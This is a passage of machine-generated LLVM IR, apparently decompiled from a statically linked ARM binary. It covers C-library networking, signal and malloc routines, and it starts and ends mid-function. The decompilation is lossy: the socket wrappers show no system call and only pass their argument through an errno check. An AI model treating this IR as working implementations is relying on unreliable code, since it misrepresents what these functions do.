  %v24_12280 = load i32, i32* @fp, align 4
  %v0_12284 = load i32, i32* @r0, align 4
  %v5_122a0 = call i32 @llvm.bswap.i32(i32 %v0_12284)
  %v0_122a4 = load i32, i32* @r1, align 4
  %v1_122a4 = add i32 %v0_122a4, 15
  store i32 %v1_122a4, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_122e0

dec_label_pc_122c4:                               ; preds = %dec_label_pc_122e0
  %v1_122cc = inttoptr i32 %v0_122fc to i8*
  %v2_122cc = call i32 @_uintmaxtostr(i8* %v1_122cc)
  %v0_122d0 = load i32, i32* @r6, align 4
  %v2_122d0 = icmp eq i32 %v0_122d0, 0
  %v1_122d4 = add i32 %v2_122cc, -1
  store i32 %v1_122d4, i32* @r1, align 4
  br i1 %v2_122d0, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_122c4
  %v1_122d8 = load i32, i32* @sl, align 4
  %v2_122d8 = trunc i32 %v1_122d8 to i8
  %v4_122d8 = inttoptr i32 %v0_122d0 to i8*
  store i8 %v2_122d8, i8* %v4_122d8, align 1
  %v0_122dc.pre = load i32, i32* @r1, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_122c4, %bb
  %v0_122dc = phi i32 [ %v1_122d4, %dec_label_pc_122c4 ], [ %v0_122dc.pre, %bb ]
  store i32 %v0_122dc, i32* @r6, align 4
  %v0_122e0.pre = load i32, i32* @r5, align 4
  %v0_122e4.pre = load i32, i32* @r7, align 4
  %v1_122e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_122e0

dec_label_pc_122e0:                               ; preds = %entry, %bb17
  %v0_122fc = phi i32 [ %v1_122a4, %entry ], [ %v0_122dc, %bb17 ]
  %v1_122e4 = phi i32 [ %v5_122a0, %entry ], [ %v1_122e4.pre, %bb17 ]
  %v0_122e4 = phi i32 [ 255, %entry ], [ %v0_122e4.pre, %bb17 ]
  %v0_122f4 = phi i32 [ 0, %entry ], [ %v0_122e0.pre, %bb17 ]
  %v7_122e0 = icmp eq i32 %v0_122f4, 3
  store i1 %v7_122e0, i1* @cpsr_z, align 1
  %v2_122e4 = and i32 %v0_122e4, %v1_122e4
  store i32 %v2_122e4, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_122f0 = udiv i32 %v1_122e4, 256
  store i32 %v3_122f0, i32* @r4, align 4
  %v1_122f4 = add i32 %v0_122f4, 1
  store i32 %v1_122f4, i32* @r5, align 4
  %v7_122f8 = icmp sgt i32 %v0_122f4, 3
  br i1 %v7_122f8, label %dec_label_pc_122fc, label %dec_label_pc_122c4

dec_label_pc_122fc:                               ; preds = %dec_label_pc_122e0
  %v1_122fc = add i32 %v0_122fc, 1
  store i32 %v3_12280, i32* @r4, align 4
  store i32 %v6_12280, i32* @r5, align 4
  store i32 %v9_12280, i32* @r6, align 4
  store i32 %v12_12280, i32* @r7, align 4
  store i32 %v15_12280, i32* @r8, align 4
  store i32 %v18_12280, i32* @sb, align 4
  store i32 %v21_12280, i32* @sl, align 4
  store i32 %v24_12280, i32* @fp, align 4
  ret i32 %v1_122fc

; uselistorder directives
  uselistorder i32 %v0_122f4, { 2, 0, 1 }
  uselistorder i32 %v0_122dc, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_122e0, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 28804), i32* @r1, align 4
  %v0_1231c = call i32 @__GI_inet_ntoa_r()
  %v0_12320 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12320, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_12320 = load i32, i32* @r4, align 4
  %v2_12320 = trunc i32 %v1_12320 to i16
  %v3_12320 = load i32, i32* @r1, align 4
  %v4_12320 = inttoptr i32 %v3_12320 to i16*
  store i16 %v2_12320, i16* %v4_12320, align 2
  %v2_12324 = load i32, i32* @r4, align 4
  %v4_12324 = mul i32 %v2_12324, 2
  %v5_12324 = and i32 %v4_12324, %v0_1231c
  store i32 %v5_12324, i32* @r7, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  ret i32 %v0_1231c

; uselistorder directives
  uselistorder i32 %v0_1231c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_12330 = ptrtoint i32* %stack_var_-12 to i32
  %v0_12334 = load i32, i32* @r0, align 4
  %v2_12334 = inttoptr i32 %v0_12334 to i8*
  %v3_12334 = call i32 @inet_aton(i8* %v2_12334, i32 %v2_12330)
  %v2_12338 = icmp eq i32 %v3_12334, 0
  %v4_1233c = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_12338, i32 -1, i32 %v4_1233c
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_1235c = call i32 @__GI_gethostbyname2()
  ret i32 %v0_1235c
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1236c = load i32, i32* @r4, align 4
  %v6_1236c = load i32, i32* @r5, align 4
  %v0_12374 = load i32, i32* @r0, align 4
  store i32 %v0_12374, i32* @r4, align 4
  %v0_12378 = load i32, i32* @r1, align 4
  store i32 %v0_12378, i32* @r5, align 4
  %v0_1237c = call i32 @__GI___h_errno_location()
  %v0_123a4 = load i32, i32* @r4, align 4
  %v2_123a8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_123a8, i32* @ip, align 4
  %v0_123ac = load i32, i32* @r5, align 4
  %v8_123b4 = call i32 @gethostbyname2_r(i32 %v0_123a4, i32 %v0_123ac, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 29260) to i32*), i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 28820), i32 440, i32 %v2_123a8, i32 %v0_1237c)
  %v3_123b8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_1236c, i32* @r4, align 4
  store i32 %v6_1236c, i32* @r5, align 4
  ret i32 %v3_123b8
}

define i32 @function_123cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_123cc:
  %v0_123cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_123cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_123cc
  %v1_123cc = load i32, i32* @r4, align 4
  %v3_123cc = mul i32 %v1_123cc, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_123cc, %bb
  %v7_123d0 = phi i32 [ %arg1, %dec_label_pc_123cc ], [ %v3_123cc, %bb ]
  ret i32 %v7_123d0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123d4 = load i32, i32* @r7, align 4
  store i32 %v3_123d4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_123fc, label %dec_label_pc_123ec

dec_label_pc_123ec:                               ; preds = %entry
  %v0_123ec = call i32 @__GI___errno_location()
  %v0_123f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_123f0 = sub i32 0, %v0_123f0
  %v2_123f4 = inttoptr i32 %v0_123ec to i32*
  store i32 %v1_123f0, i32* %v2_123f4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12400.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_123fc

dec_label_pc_123fc:                               ; preds = %entry, %dec_label_pc_123ec
  %v2_12400 = phi i32 [ %v3_123d4, %entry ], [ %v2_12400.pre, %dec_label_pc_123ec ]
  %v0_123fc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_123ec ]
  store i32 %v2_12400, i32* @r7, align 4
  ret i32 %v0_123fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123fc, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1240c = load i32, i32* @r7, align 4
  store i32 %v3_1240c, i32* %stack_var_-8, align 4
  %v0_12418 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12418, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12418, -4095
  br i1 %tmp, label %dec_label_pc_12438, label %dec_label_pc_12428

dec_label_pc_12428:                               ; preds = %entry
  %v0_12428 = call i32 @__GI___errno_location()
  %v0_1242c = load i32, i32* %r7.global-to-local, align 4
  %v1_1242c = sub i32 0, %v0_1242c
  %v2_12430 = inttoptr i32 %v0_12428 to i32*
  store i32 %v1_1242c, i32* %v2_12430, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12438.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12438

dec_label_pc_12438:                               ; preds = %entry, %dec_label_pc_12428
  %v1_1243c = phi i32 [ %v0_12418, %entry ], [ -1, %dec_label_pc_12428 ]
  %v2_12438 = phi i32 [ %v3_1240c, %entry ], [ %v2_12438.pre, %dec_label_pc_12428 ]
  store i32 %v2_12438, i32* @r7, align 4
  ret i32 %v1_1243c

; uselistorder directives
  uselistorder i32 %v0_12418, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12438, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12478, label %dec_label_pc_12468

dec_label_pc_12468:                               ; preds = %entry
  %v0_12468 = call i32 @__GI___errno_location()
  %v0_1246c = load i32, i32* %r4.global-to-local, align 4
  %v1_1246c = sub i32 0, %v0_1246c
  %v2_12470 = inttoptr i32 %v0_12468 to i32*
  store i32 %v1_1246c, i32* %v2_12470, align 4
  br label %dec_label_pc_12478

dec_label_pc_12478:                               ; preds = %entry, %dec_label_pc_12468
  %v1_12480 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12468 ]
  ret i32 %v1_12480

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12478, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12488 = load i32, i32* @r7, align 4
  store i32 %v3_12488, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_124b0, label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %entry
  %v0_124a0 = call i32 @__GI___errno_location()
  %v0_124a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_124a4 = sub i32 0, %v0_124a4
  %v2_124a8 = inttoptr i32 %v0_124a0 to i32*
  store i32 %v1_124a4, i32* %v2_124a8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_124b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_124b0

dec_label_pc_124b0:                               ; preds = %entry, %dec_label_pc_124a0
  %v2_124b4 = phi i32 [ %v3_12488, %entry ], [ %v2_124b4.pre, %dec_label_pc_124a0 ]
  %v0_124b0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_124a0 ]
  store i32 %v2_124b4, i32* @r7, align 4
  ret i32 %v0_124b0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_124b0, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_124c0 = load i32, i32* @r7, align 4
  store i32 %v3_124c0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_124e8, label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %entry
  %v0_124d8 = call i32 @__GI___errno_location()
  %v0_124dc = load i32, i32* %r7.global-to-local, align 4
  %v1_124dc = sub i32 0, %v0_124dc
  %v2_124e0 = inttoptr i32 %v0_124d8 to i32*
  store i32 %v1_124dc, i32* %v2_124e0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_124ec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_124e8

dec_label_pc_124e8:                               ; preds = %entry, %dec_label_pc_124d8
  %v2_124ec = phi i32 [ %v3_124c0, %entry ], [ %v2_124ec.pre, %dec_label_pc_124d8 ]
  %v0_124e8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_124d8 ]
  store i32 %v2_124ec, i32* @r7, align 4
  ret i32 %v0_124e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_124e8, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_124f8 = load i32, i32* @r4, align 4
  store i32 %v3_124f8, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12528, label %dec_label_pc_12518

dec_label_pc_12518:                               ; preds = %entry
  %v0_12518 = call i32 @__GI___errno_location()
  %v0_1251c = load i32, i32* %r4.global-to-local, align 4
  %v1_1251c = sub i32 0, %v0_1251c
  %v2_12520 = inttoptr i32 %v0_12518 to i32*
  store i32 %v1_1251c, i32* %v2_12520, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1252c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12528

dec_label_pc_12528:                               ; preds = %entry, %dec_label_pc_12518
  %v2_1252c = phi i32 [ %v3_124f8, %entry ], [ %v2_1252c.pre, %dec_label_pc_12518 ]
  %v0_12528 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12518 ]
  store i32 %v2_1252c, i32* @r4, align 4
  ret i32 %v0_12528

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12528, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1256c, label %dec_label_pc_1255c

dec_label_pc_1255c:                               ; preds = %entry
  %v0_1255c = call i32 @__GI___errno_location()
  %v0_12560 = load i32, i32* %r4.global-to-local, align 4
  %v1_12560 = sub i32 0, %v0_12560
  %v2_12564 = inttoptr i32 %v0_1255c to i32*
  store i32 %v1_12560, i32* %v2_12564, align 4
  br label %dec_label_pc_1256c

dec_label_pc_1256c:                               ; preds = %entry, %dec_label_pc_1255c
  %v1_12574 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1255c ]
  ret i32 %v1_12574

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1256c, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1257c = load i32, i32* @r7, align 4
  store i32 %v3_1257c, i32* %stack_var_-8, align 4
  %v0_12588 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12588, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12588, -4095
  br i1 %tmp, label %dec_label_pc_125a8, label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %entry
  %v0_12598 = call i32 @__GI___errno_location()
  %v0_1259c = load i32, i32* %r7.global-to-local, align 4
  %v1_1259c = sub i32 0, %v0_1259c
  %v2_125a0 = inttoptr i32 %v0_12598 to i32*
  store i32 %v1_1259c, i32* %v2_125a0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_125a8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_125a8

dec_label_pc_125a8:                               ; preds = %entry, %dec_label_pc_12598
  %v1_125ac = phi i32 [ %v0_12588, %entry ], [ -1, %dec_label_pc_12598 ]
  %v2_125a8 = phi i32 [ %v3_1257c, %entry ], [ %v2_125a8.pre, %dec_label_pc_12598 ]
  store i32 %v2_125a8, i32* @r7, align 4
  ret i32 %v1_125ac

; uselistorder directives
  uselistorder i32 %v0_12588, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_125a8, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_125b4 = load i32, i32* @r4, align 4
  %v0_125bc = call i32 @__GI_getpid()
  %v2_125c4 = call i32 @kill(i32 %v0_125bc, i32 %arg1)
  store i32 %v3_125b4, i32* @r4, align 4
  ret i32 %v2_125c4

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__GI_getpid, { 0, 3, 2, 1 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_125e8, label %dec_label_pc_125e0

dec_label_pc_125e0:                               ; preds = %entry
  %v7_125e4 = icmp slt i32 %arg1, 65
  br i1 %v7_125e4, label %dec_label_pc_125fc, label %dec_label_pc_125e8

dec_label_pc_125e8:                               ; preds = %dec_label_pc_125e0, %entry
  %v0_125e8 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_125f4 = inttoptr i32 %v0_125e8 to i32*
  store i32 22, i32* %v2_125f4, align 4
  %v0_12604.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12604

dec_label_pc_125fc:                               ; preds = %dec_label_pc_125e0
  %v0_125fc = call i32 @__sigaddset()
  store i32 %v0_125fc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12604

dec_label_pc_12604:                               ; preds = %dec_label_pc_125e8, %dec_label_pc_125fc
  %v0_12604 = phi i32 [ %v0_12604.pre, %dec_label_pc_125e8 ], [ %v0_125fc, %dec_label_pc_125fc ]
  ret i32 %v0_12604

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12604, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1261c = add i32 %tmp, 4
  %v3_1261c = inttoptr i32 %v2_1261c to i32*
  store i32 0, i32* %v3_1261c, align 4
  %v1_12620 = load i32, i32* %r3.global-to-local, align 4
  %v2_12620 = inttoptr i32 %v1_12620 to i32*
  store i32 0, i32* %v2_12620, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12628 = load i32, i32* @r4, align 4
  store i32 %v3_12628, i32* %stack_var_-16, align 4
  %v6_12628 = load i32, i32* @r5, align 4
  %v9_12628 = load i32, i32* @r6, align 4
  %v7_12630 = icmp eq i32 %arg2, -1
  br i1 %v7_12630, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_12638 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_12654

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1265c

dec_label_pc_12654:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r6, align 4
  %v7_12658 = icmp slt i32 %arg1, 65
  br i1 %v7_12658, label %dec_label_pc_12670, label %dec_label_pc_1265c

dec_label_pc_1265c:                               ; preds = %.thread16, %dec_label_pc_12654
  %v0_1265c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12668 = inttoptr i32 %v0_1265c to i32*
  store i32 22, i32* %v2_12668, align 4
  %v0_126c8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_12670:                               ; preds = %dec_label_pc_12654
  %v2_12670 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12670, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_12678 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_12678, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_12688 = call i32 @__sigaddset()
  %v0_12690 = load i32, i32* @r5, align 4
  %v0_12694 = load i32, i32* @r6, align 4
  %v2_12694 = add i32 %v0_12694, 29448
  %v2_12698 = call i32 @__GI___sigismember(i32 %v2_12694, i32 %v0_12690)
  store i32 %v2_12638, i32* %r2.global-to-local, align 4
  %v0_126b0 = load i32, i32* @r5, align 4
  %v3_126b8 = call i32 @__libc_sigaction(i32 %v0_126b0, i32 %v2_12670, i32 %v2_12638)
  %v1_126bc = icmp slt i32 %v3_126b8, 0
  br i1 %v1_126bc, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_12670
  %v5_126c0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_126c0, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_12670
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1265c, %bb32
  %v0_126c8 = phi i32 [ %v5_126c0, %bb31 ], [ %v0_126c8.pre, %dec_label_pc_1265c ], [ -1, %bb32 ]
  %v2_126d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_126d0, i32* @r4, align 4
  store i32 %v6_12628, i32* @r5, align 4
  store i32 %v9_12628, i32* @r6, align 4
  ret i32 %v0_126c8

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1265c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_126e0 = add i32 %arg2, -1
  %v3_126e4 = udiv i32 %v1_126e0, 32
  %v4_126e8 = mul nuw nsw i32 %v3_126e4, 4
  %v5_126e8 = add i32 %v4_126e8, %arg1
  %v6_126e8 = inttoptr i32 %v5_126e8 to i32*
  %v7_126e8 = load i32, i32* %v6_126e8, align 4
  %v1_126ec = urem i32 %v1_126e0, 32
  %v7_126f4 = shl i32 1, %v1_126ec
  %v8_126f4 = and i32 %v7_126e8, %v7_126f4
  %v10_126f4 = icmp ne i32 %v8_126f4, 0
  %. = zext i1 %v10_126f4 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_126e0, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_12704 = load i32, i32* @r1, align 4
  %v1_12704 = add i32 %v0_12704, -1
  %v3_12708 = udiv i32 %v1_12704, 32
  %v0_1270c = load i32, i32* @r0, align 4
  %v4_1270c = mul nuw nsw i32 %v3_12708, 4
  %v5_1270c = add i32 %v0_1270c, %v4_1270c
  %v6_1270c = inttoptr i32 %v5_1270c to i32*
  %v7_1270c = load i32, i32* %v6_1270c, align 4
  %v1_12710 = urem i32 %v1_12704, 32
  %v7_12718 = shl i32 1, %v1_12710
  %v8_12718 = or i32 %v7_1270c, %v7_12718
  store i32 %v8_12718, i32* %v6_1270c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12704, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12728 = add i32 %arg2, -1
  %v3_1272c = udiv i32 %v1_12728, 32
  %v4_12730 = mul nuw nsw i32 %v3_1272c, 4
  %v5_12730 = add i32 %v4_12730, %arg1
  %v6_12730 = inttoptr i32 %v5_12730 to i32*
  %v7_12730 = load i32, i32* %v6_12730, align 4
  %v1_12734 = urem i32 %v1_12728, 32
  %tmp = shl i32 -1, %v1_12734
  %v8_1273c = add i32 %tmp, -1
  %v9_1273c = and i32 %v7_12730, %v8_1273c
  store i32 %v9_1273c, i32* %v6_12730, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12728, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_1274c = udiv i32 %arg1, 256
  store i32 %v3_1274c, i32* %r1.global-to-local, align 4
  %v2_12750 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_12750, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_1275c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12750, i32 %v0_1275c)
  %v0_12760 = load i32, i32* %r1.global-to-local, align 4
  %v1_12760 = add i32 %v0_12760, 1048320
  %v3_12764 = udiv i32 %v1_12760, 65536
  %v1_12768 = and i32 %v3_12764, 8
  %v6_1276c = shl i32 %v0_12760, %v1_12768
  %v1_12770 = add i32 %v6_1276c, 520192
  %v3_12774 = udiv i32 %v1_12770, 65536
  %v1_12778 = and i32 %v3_12774, 4
  %v6_1277c = shl i32 %v6_1276c, %v1_12778
  %v1_12780 = add i32 %v6_1277c, 245760
  %v3_12784 = udiv i32 %v1_12780, 65536
  %v1_12788 = and i32 %v3_12784, 2
  %v6_1278c = shl i32 %v6_1277c, %v1_12788
  store i32 %v6_1278c, i32* %r1.global-to-local, align 4
  %v1_12790 = sub nsw i32 13, %v1_12768
  %v2_12794 = sub nsw i32 %v1_12790, %v1_12778
  %v3_12798 = udiv i32 %v6_1278c, 32768
  %v4_12798 = sub nuw nsw i32 -1, %v3_12798
  %v4_1279c = udiv i32 %v6_1278c, 16384
  %v5_1279c = and i32 %v4_1279c, %v4_12798
  %v2_127a0 = sub nsw i32 %v2_12794, %v1_12788
  %v2_127a4 = add nsw i32 %v2_127a0, %v5_1279c
  %v1_127a8 = add nsw i32 %v2_127a4, 6
  %v0_127ac = load i32, i32* %ip.global-to-local, align 4
  %v6_127ac = lshr i32 %v0_127ac, %v1_127a8
  %v3_127b0 = mul nsw i32 %v2_127a4, 4
  %v1_127b4 = add nsw i32 %v3_127b0, 32
  %v1_127b8 = urem i32 %v6_127ac, 4
  %v2_127bc = or i32 %v1_127b8, %v1_127b4
  ret i32 %v2_127bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
